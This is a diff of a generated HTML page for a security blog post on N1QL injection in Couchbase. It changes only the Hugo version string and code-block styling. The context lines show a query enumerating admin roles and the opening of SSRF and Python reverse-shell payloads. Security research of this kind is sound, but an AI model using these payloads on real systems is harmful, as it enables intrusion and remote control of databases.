@@ -3,7 +3,7 @@
   <head>
     <title>N1QL Injection - Part 3 // FelSec - Blog</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Hugo 0.160.1">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="FelSec" />
     <meta name="description" content="" />
@@ -168,7 +168,7 @@ select r from system:my_user_info UNNEST roles as r where r.`role`LIKE&#39;%admi
 <p>The following examples demonstrate how this can be used for SSRF and remote shell payloads. (<strong>Important Note</strong>: Privileged access to the Analytics service is required to exploit this. Additionally, network access to the Analytics service or the Couchbase console is also required.)</p>
 <h4 id="ssrf">SSRF</h4>
 <p>Payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">felsec</span>:
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">testing</span>(self):
@@ -219,7 +219,7 @@ Connection: keep-alive
 User-Agent: python-requests/2.31.0
 </code></pre><h4 id="reverse-shell">Reverse Shell</h4>
 <p>Payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">felsec</span>:
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">testing</span>(self):
 </span></span><span style="display:flex;"><span>		s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
